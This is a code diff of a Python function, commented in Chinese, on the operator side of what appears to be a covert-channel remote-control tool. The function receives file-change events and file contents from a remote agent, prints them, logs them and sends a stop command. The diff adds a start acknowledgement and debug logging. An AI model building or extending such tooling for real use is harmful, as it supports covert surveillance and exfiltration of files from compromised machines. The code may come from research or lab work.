@@ -302,22 +302,42 @@ def cmd_monitor_file(comm: Commander):
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
+            # 先读一条启动确认（MON_FILE_STARTED 或错误），并记录
+            start_resp = comm.recv_covert_message()
+            if start_resp:
+                decoded = start_resp.decode(errors="ignore")
+                try:
+                    m0 = json.loads(decoded)
+                    print(f"[{m0['timestamp']}] {m0['type']}: {m0.get('path', '')}")
+                    logfile.write(json.dumps(m0, ensure_ascii=False) + "\n")
+                except json.JSONDecodeError:
+                    print("[DEBUG] 非 JSON 启动响应:", decoded.strip())
+                    logfile.write(decoded + "\n")
+                logfile.flush()
+
+            # 进入主循环
             while True:
                 data = comm.recv_covert_message()
-                if not data:
+                if data is None:
                     continue
+                # 先打个调试
+                print("[DEBUG raw data]:", data)
+                text = data.decode(errors="ignore")
+                # 尝试当 JSON 解析
                 try:
-                    msg = json.loads(data.decode(errors="ignore"))
+                    msg = json.loads(text)
+                    # 标准 JSON 事件
+                    print(f"[{msg['timestamp']}] 事件 {msg['type']} | {msg.get('path', '')}")
+                    if 'content' in msg:
+                        print(msg['content'])
+                    print("-" * 40)
+                    logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
                 except json.JSONDecodeError:
-                    continue
-
-                print(f"[{msg['timestamp']}] 文件更改: {msg['path']}")
-                if 'content' in msg:
-                    print(msg['content'])
-                print("-" * 40)
-
-                logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
+                    # 非 JSON 文本也记录，以防万一
+                    print("[DEBUG] 非 JSON 消息:", text.strip())
+                    logfile.write(text + "\n")
                 logfile.flush()
+
         except KeyboardInterrupt:
             print("\n[*] 停止文件监控。")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
